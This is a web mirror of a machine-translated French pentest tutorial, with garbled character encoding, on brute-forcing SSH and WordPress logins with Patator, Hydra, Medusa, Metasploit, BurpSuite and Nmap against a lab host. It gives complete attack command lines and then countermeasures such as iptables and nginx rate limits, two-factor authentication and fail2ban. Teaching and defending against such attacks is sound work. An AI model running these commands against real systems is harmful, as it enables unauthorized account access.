<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üôÜüèø ü§≤üèª üò≥ Attaques par force brute avec Kali Linux üëö ‚úã üéç</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="La force brute (attaque par force brute) est une m√©thode de r√©solution de probl√®mes math√©matiques dont la complexit√© d√©pend du nombre de toutes les so...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Attaques par force brute avec Kali Linux</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pentestit/blog/434216/"><img src="https://habrastorage.org/webt/zv/o2/x0/zvo2x0ojtk15u7uwaecj7kdpc-u.jpeg"><br><br>  La force brute (attaque par force brute) est une m√©thode de r√©solution de probl√®mes math√©matiques dont la complexit√© d√©pend du nombre de toutes les solutions possibles.  Le terme brute-force lui-m√™me est g√©n√©ralement utilis√© dans le contexte des attaques de pirates lorsqu'un attaquant tente de r√©cup√©rer un nom d'utilisateur / mot de passe pour un compte ou un service. <br><br>  Consid√©rez les outils qui peuvent √™tre utilis√©s pour effectuer des attaques par force brute sur les services SSH et WEB disponibles dans Kali Linux (Patator, Medusa, Hydra, Metasploit), ainsi que BurpSuite. <br><a name="habracut"></a><br><blockquote>  Tous les mat√©riaux fournis dans le cadre de cet article sont destin√©s √† un usage p√©dagogique uniquement.  L'utilisation de mat√©riaux √† des fins ill√©gales et ill√©gales est interdite. <br></blockquote><br><h2>  Brute-force ssh </h2><br>  Par exemple, prenez la machine de test 192.168.60.50 et essayez de trouver le mot de passe du test utilisateur par SSH.  Nous utiliserons des mots de passe populaires du dictionnaire rockyou.txt standard. <br><br><hr><br>  <b>Patator</b> <br>  Pour s√©lectionner un mot de passe √† l'aide de Patator, utilisez la commande: <br><br> <code>patator ssh_login host=192.168.60.50 user=test password=FILE0 0=/root/wordlist -x ignore:mesg='Authentication failed'</code> <br> <br>  o√π: <br>  <b>ssh_login</b> - module requis <br>  <b>l'h√¥te</b> est notre objectif <br>  <b>utilisateur</b> - connexion <b>utilisateur</b> √† laquelle un mot de passe ou un fichier avec des connexions pour une s√©lection multiple est s√©lectionn√© <br>  <b>mot de passe</b> - dictionnaire avec mots de passe <br>  <b>-x ignore: mesg = '√âchec de l'authentification'</b> - commande de ne pas afficher de ligne avec ce message.  Le param√®tre de filtrage est s√©lectionn√© individuellement. <br><br><img src="https://habrastorage.org/webt/yk/9s/qg/yk9sqghqquqm8814u0jh7sgonac.png" alt="image"><br><br><hr><br>  <b>Hydra</b> <br>  Pour s√©lectionner un mot de passe √† l'aide d'Hydra, ex√©cutez la commande: <br><br> <code>hydra -V -f -t 4 -l test -P /root/wordlist ssh://192.168.60.50</code> <br> <br>  o√π: <br>  <b>-V</b> - afficher une paire de nom d'utilisateur + mot de passe pendant l'it√©ration <br>  <b>-f</b> - arr√™te d√®s que le mot de passe pour la connexion sp√©cifi√©e est trouv√© <br>  <b>-P</b> - chemin d'acc√®s au dictionnaire avec mots de passe <br>  <b>ssh: //192.168.60.50</b> - indication de service et adresse IP de la victime <br><br><img src="https://habrastorage.org/webt/ys/qd/xv/ysqdxvgtpatu8to2q_lmdrzp9y0.png" alt="image"><br><br><hr><br>  <b>M√©duse</b> <br>  Pour s√©lectionner un mot de passe √† l'aide de Medusa, ex√©cutez la commande: <br><br> <code>medusa -h 192.168.60.50 -u test -P /root/wordlist -M ssh -f -v 6</code> <br> <br>  o√π: <br>  <b>-h</b> - adresse IP de la victime <br>  <b>-u</b> - connexion <br>  <b>-P</b> - chemin du dictionnaire <br>  <b>-M</b> - s√©lection du module <br>  <b>-f</b> - s'arr√™te apr√®s avoir trouv√© une paire nom d'utilisateur / mot de passe valide <br>  <b>-v -</b> r√©glage de l'affichage des messages √† l'√©cran pendant le processus de s√©lection <br><br><img src="https://habrastorage.org/webt/p_/i4/df/p_i4dfjf697ssbosu6f1fxzj0qk.png" alt="image"><br><br><hr><br>  <b>Metasploit</b> <br>  Nous chercherons un outil pour mener des attaques par force brute sur SSH: <br>  <code>search ssh_login</code> et <code>search ssh_login</code> la r√©ponse: <br><br><img src="https://habrastorage.org/webt/z1/kz/s3/z1kzs3syz3jdf7jcpjnxzj37d5y.png" alt="image"><br><br>  Nous utilisons le module: <br><br> <code>use auxiliary/scanner/ssh/ssh_login</code> <br> <br>  Pour afficher les param√®tres n√©cessaires, utilisez la commande <code>show options</code> .  Pour nous, c'est: <br>  <b>rhosts</b> - adresse IP de la victime <br>  <b>rport</b> - port <br>  <b>nom d'utilisateur</b> - connexion SSH <br>  <b>userpass_file</b> - chemin d'acc√®s au dictionnaire <br>  <b>stop_on_success</b> - arr√™te d√®s qu'il y a une paire nom d'utilisateur / mot de passe <br>  <b>threads</b> - nombre de threads <br><br><img src="https://habrastorage.org/webt/yl/jd/tn/yljdtnsmzwi4663yl4swbrvg8zg.png" alt="image"><br><br>  L'indication des param√®tres n√©cessaires se fait via la commande " <b>set</b> ". <br><br> <code>set rhosts 192.168.60.50</code> <br> <code>set username test <br> set userpass_file /root/wordlist <br> set stop_on_success yes <br> set threads 4 <br> set rport 22</code> <br> <br>  Apr√®s avoir sp√©cifi√© les param√®tres n√©cessaires, nous tapons la commande " <b>run</b> " et attendons. <br><br><img src="https://habrastorage.org/webt/8h/wp/nt/8hwpnt8bls7vuuv0knw86hx-kby.png" alt="image"><br><br><h3>  Contre-action </h3><br>  Limitez le nombre de connexions √©tablies √† l'aide d'un pare-feu.  Exemple de configuration d'iptables: <br><br>  <code>-A INPUT -i eth0 -p tcp --dport 22 -m connlimit --connlimit-above 1 --connlimit-mask 32 -j REJECT --reject-with tcp-reset</code> . <br><br>  Une telle r√®gle limitera l'acc√®s √† SSH pour chaque adresse IP √† 1 connexion par seconde, ce qui complique consid√©rablement la recherche.  En outre, une solution efficace peut √™tre l'utilisation d'une authentification √† deux facteurs (par exemple, en utilisant eToken) ou une authentification en utilisant une paire de cl√©s, ainsi que l'utilisation d'ACL bas√©es sur des adresses IP. <br><br><h2>  WordPress √† force brute </h2><br>  Prenons un autre exemple - la s√©lection du mot de passe pour la fen√™tre d'autorisation du formulaire Web. <br><br><img src="https://habrastorage.org/webt/sv/lo/oi/svlooiyalsm5q11pt3pslw_1cqo.png" alt="image"><br><br>  Par exemple, nous s√©lectionnerons le mot de passe dans le compte administrateur wordpress. <br><br><hr><br>  <b>Burpsuite</b> <br>  Tout d'abord, nous devons comprendre comment se d√©roule le processus d'autorisation.  Pour cela, nous utiliserons BurpSuite.  Nous devons essayer de nous connecter avec n'importe quel mot de passe et connexion afin de voir quelles demandes passent par BurpSuite. <br><br><img src="https://habrastorage.org/webt/gb/zo/2c/gbzo2cqqvnl3tuxwcpbbujk1zgs.png" alt="image"><br><br>  Eh bien, nous avons vu une demande d'autorisation POST, nous allons travailler avec elle. <br>  BODY indique quel identifiant et mot de passe ont √©t√© v√©rifi√©s, ce qui signifie que nous pouvons essayer de remplacer les valeurs dont nous avons besoin par nous-m√™mes. <br>  Nous transmettons cette demande √† Intruder et nous s√©lectionnons les param√®tres n√©cessaires pour l'attaque.  Dans l'√©l√©ment Positions de charge utile, nous laissons le type d'attaque comme tireur d'√©lite, mais pour v√©rification, nous ne laissons que le param√®tre pwd.  Ainsi, une attaque ne changera que ce param√®tre. <br><br><img src="https://habrastorage.org/webt/ru/a4/oi/rua4oiu-gz5hilmjujvajblxgs8.png" alt="image"><br><br>  Nous chargeons le dictionnaire n√©cessaire et commen√ßons l'attaque. <br><br><img src="https://habrastorage.org/webt/qf/dw/dt/qfdwdtl1-e6gohgyhzsllu-dny8.png" alt="image"><br><br>  D'apr√®s le comportement de l'application Web, nous voyons que le mot de passe incorrect renvoie le code de r√©ponse 200. Apr√®s avoir recherch√© le dictionnaire, nous voyons que l'un des mots de passe a donn√© la r√©ponse avec le code 302 - il est correct. <br><br><img src="https://habrastorage.org/webt/lf/cz/tz/lfcztzibwkvx8rrppdbfs3li-ny.png" alt="image"><br><br>  Cette m√©thode de force brute prend beaucoup plus de temps que lors de l'utilisation de Patator, Hydra, Medusa, etc.  M√™me si nous avons pris un petit dictionnaire, BurpSuite a parcouru le dictionnaire pendant environ 40 minutes. <br><br><hr><br>  <b>Hydra</b> <br>  Essayons de trouver le mot de passe en utilisant Hydra. <br>  Comme nous le savons d√©j√†, si l'autorisation est incorrecte, le code 200 est renvoy√©, et en cas de succ√®s, le code est 302. Essayons d'utiliser ces informations. <br>  Pour commencer, utilisez la commande: <br><br> <code>hydra -V -f -l admin -P /root/wordlist -t 4 http-post-form://192.168.60.50 -m "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.60.50%2Fwp-admin%2F&amp;testcookie=1:S=302"</code> <br> <br>  Ici, nous indiquons les param√®tres requis: <br>  <b>-l</b> - nom d'utilisateur <br>  <b>-P</b> - dictionnaire avec mots de passe <br>  <b>-t</b> - nombre de threads <br>  <b>http-post-form</b> - type de formulaire, nous avons POST. <br>  <b>/wp-login.php</b> est l'URL de la page d'autorisation <br>  <b>^ USER ^</b> - indique o√π remplacer le nom d'utilisateur <br>  <b>^ PASS ^</b> - indique o√π remplacer le mot de passe du dictionnaire <br>  <b>S = 302</b> - une indication de quelle r√©ponse s'appuyer sur Hydra.  Dans notre cas, la r√©ponse est 302 en cas d'autorisation r√©ussie. <br><br><img src="https://habrastorage.org/webt/jd/ft/yp/jdftypn_8za5oyqcdattmnwcwce.png" alt="image"><br><br><hr><br>  <b>Patator</b> <br>  Comme nous le savons d√©j√†, si l'autorisation √©choue, le code 200 est retourn√©, et en cas de succ√®s, il renvoie 302. Nous utiliserons le m√™me principe qu'avec Hydra: <br>  Le lancement est effectu√© par la commande: <br><br> <code>patator http_fuzz url=http://192.168.60.50/wp-login.php method=POST body='log=admin&amp;pwd=FILE0&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.60.50%2Fwp-admin%2F&amp;testcookie=1' 0=/root/wordlist -t 4 before_urls=http://192.168.60.50/wp-login.php -x ignore:code=200 accept_cookie=1</code> <br> <br>  <b>http_fuzz</b> - module pour l'attaque http par force brute <br>  <b>url</b> - adresse de la page avec autorisation <br>  <b>FILE0</b> - chemin d'acc√®s au dictionnaire avec mots de passe <br>  <b>corps</b> - informations transmises dans la demande POST lors de l'autorisation <br>  <b>-t</b> - nombre de threads <br>  <b>-x</b> - Dans ce cas, nous avons sp√©cifi√© la commande de ne pas afficher les lignes de message contenant un param√®tre avec le code 200 <br>  <b>accept_cookie</b> - enregistre le param√®tre du cookie et le transmet √† la prochaine requ√™te <br>  En cons√©quence, nous avons r√©ussi √† trouver un mot de passe. <br><br><img src="https://habrastorage.org/webt/m0/el/tw/m0eltwkb6kp6d2joca248ceof2o.png" alt="image"><br><br><hr><br>  <b>Nmap</b> <br>  L'utilitaire Nmap permet, entre autres, la s√©lection de mots de passe pour les formulaires d'autorisation Web, si vous utilisez le script <b>http-wordpress-brute</b> avec les arguments correspondants: <br>  <b>--script-args</b> - ajout d'arguments <br>  <b>user</b> ou <b>userdb</b> - connexion ou fichier avec connexions <br>  <b>pass</b> ou <b>passdb</b> - sp√©cifiez un mot de passe ou un dictionnaire <br>  <b>thread</b> - nombre de threads <br>  <b>firstonly = true</b> - affiche le r√©sultat apr√®s le premier mot de passe correct <br><br> <code>nmap 192.168.60.50 --script http-wordpress-brute --script-args 'user= admin,passdb= /root/wordlist, http-wordpress-brute.thread=3, brute.firstonly=true'</code> <br> <br><img src="https://habrastorage.org/webt/kj/-k/dn/kj-kdnrb0qxnjem-x4rfrebahxa.png" alt="image"><br><br><h3>  Contre-action </h3><br>  Limitez (compliquez) les attaques par force brute sur les applications Web en utilisant iptables (similaire √† SSH) et nginx.  Pour ce faire, cr√©ez une zone limite: <br> <code>... <br> limit_req_zone $binary_remote_addr zone=req_limits:10m rate=30r/s; <br> ... <br></code> <br>  et l'utiliser: <br> <code>location / { <br> ... <br> limit_req zone=req_limits burst=10; <br> limit_req_status 429; <br> ... <br> } <br></code> <br>  Ces param√®tres limiteront le nombre de demandes d'une adresse IP √† 40 par seconde. <br><br>  Pour compliquer la t√¢che d'√©num√©ration, vous pouvez utiliser les m√©thodes suivantes: <br>  - L'utilisation d'un pare-feu et d'autres logiciels pour limiter le nombre d'appels au service prot√©g√©.  Vous pouvez d√©couvrir comment nous utilisons l'apprentissage automatique pour d√©tecter de telles attaques (y compris celles qui sont distribu√©es) dans un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">article</a> . <br>  - L'utilisation d'outils qui emp√™chent une v√©rification rapide de l'exactitude de la cl√© (par exemple, Captcha). <br><br><h2>  Conclusion </h2><br>  Dans cet article, nous avons examin√© superficiellement certains outils populaires.  Vous pouvez r√©duire le risque de deviner un mot de passe en suivant ces instructions: <br>  - Utilisez des mots de passe r√©sistants aux mots de passe; <br>  - Ne cr√©ez pas de mots de passe √† l'aide d'informations personnelles, par exemple: date de naissance ou nom + date de naissance ou t√©l√©phone portable; <br>  - changer r√©guli√®rement le mot de passe; <br>  - Utilisez des mots de passe uniques sur tous les comptes. <br><br>  Peu de personnes suivent ces recommandations (ainsi que des recommandations pour un d√©veloppement Web s√©curis√©), vous devez donc utiliser diverses solutions logicielles qui vous permettent de: <br>  - limiter la connexion par adresse IP ou, si cela n'est pas possible, limiter le nombre de connexions simultan√©es au service (en utilisant iptables, nginx et autres); <br>  - utiliser l'authentification √† deux facteurs; <br>  - D√©tectez et bloquez ces attaques en utilisant SIEM, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">WAF</a> ou autres (par exemple, fail2ban). </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr434216/">https://habr.com/ru/post/fr434216/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr434206/index.html">Distributeur de jet ok.ru/music</a></li>
<li><a href="../fr434208/index.html">Comment Go a sauv√© notre Black Friday</a></li>
<li><a href="../fr434210/index.html">Analyse du concours de quiz Android du stand HeadHunter au Mobius 2018 Moscou</a></li>
<li><a href="../fr434212/index.html">Tour de Tesla. Que se passe-t-il dans et pr√®s d'un gratte-ciel lorsque la foudre frappe?</a></li>
<li><a href="../fr434214/index.html">Proxy dynamique Java: qu'est-ce que c'est et comment l'utiliser?</a></li>
<li><a href="../fr434218/index.html">Bot clicker Java simple sur l'exemple du jeu World of Warcraft 3.3.5a</a></li>
<li><a href="../fr434220/index.html">Entr√©e dans Aeronet: lancement d'un quadricopt√®re autonome dans un environnement virtuel</a></li>
<li><a href="../fr434222/index.html">Station au sol Amazon √† louer - recevez et traitez les donn√©es des satellites</a></li>
<li><a href="../fr434224/index.html">√âv√©nements num√©riques √† Moscou du 24 au 30 d√©cembre</a></li>
<li><a href="../fr434228/index.html">Comment renforcer la s√©curit√© des applications Web avec des en-t√™tes HTTP</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>